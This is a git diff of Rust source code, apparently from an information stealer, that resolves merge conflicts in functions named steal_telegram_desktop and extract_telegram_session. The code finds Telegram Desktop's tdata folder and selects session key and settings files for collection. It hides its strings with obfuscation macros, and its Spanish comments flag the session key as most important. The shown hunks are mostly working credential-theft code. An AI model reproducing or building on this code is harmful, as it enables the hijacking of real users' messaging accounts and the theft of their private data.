@@ -44,13 +44,9 @@ fn steal_telegram_desktop() -> Vec<TelegramSession> {
     };
 
     // Telegram Desktop guarda datos en %APPDATA%\Telegram Desktop\tdata
-<<<<<<< HEAD
     let telegram_path = roaming_appdata
         .join(obfstr!("Telegram Desktop"))
         .join(obfstr!("tdata"));
-=======
-    let telegram_path = roaming_appdata.join(obfstr!("Telegram Desktop")).join(obfstr!("tdata"));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if !telegram_path.exists() {
         return sessions;
@@ -86,21 +82,12 @@ fn steal_telegram_desktop() -> Vec<TelegramSession> {
             }
 
             // Archivos importantes (OFUSCADOS):
-<<<<<<< HEAD
             let is_important = file_name == obfstr!("key_datas") ||              // ¡MUY IMPORTANTE! Clave de sesión
-=======
-            let is_important =
-                file_name == obfstr!("key_datas") ||              // ¡MUY IMPORTANTE! Clave de sesión
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 file_name == obfstr!("key_data") ||
                 file_name.starts_with(obfstr!("D877F783D5D3EF8C")) ||  // Archivos de sesión
                 file_name.starts_with(obfstr!("map")) ||          // Mapeo
                 file_name.starts_with(obfstr!("settings")) ||     // Configuraciones
-<<<<<<< HEAD
                 file_name.ends_with("s") && file_name.len() == 17; // Archivos de sesión hexadecimal
-=======
-                file_name.ends_with("s") && file_name.len() == 17;  // Archivos de sesión hexadecimal
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             if is_important {
                 session_files.push(file_name);
@@ -198,22 +185,12 @@ fn extract_telegram_session(tdata_path: &PathBuf, app_type: &str) -> Option<Tele
             }
 
             // Archivos importantes (OFUSCADOS)
-<<<<<<< HEAD
             let is_important = file_name == obfstr!("key_datas")
                 || file_name == obfstr!("key_data")
                 || file_name.starts_with(obfstr!("D877F783D5D3EF8C"))
                 || file_name.starts_with(obfstr!("map"))
                 || file_name.starts_with(obfstr!("settings"))
                 || (file_name.ends_with("s") && file_name.len() == 17);
-=======
-            let is_important =
-                file_name == obfstr!("key_datas") ||
-                file_name == obfstr!("key_data") ||
-                file_name.starts_with(obfstr!("D877F783D5D3EF8C")) ||
-                file_name.starts_with(obfstr!("map")) ||
-                file_name.starts_with(obfstr!("settings")) ||
-                (file_name.ends_with("s") && file_name.len() == 17);
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             if is_important {
                 session_files.push(file_name);
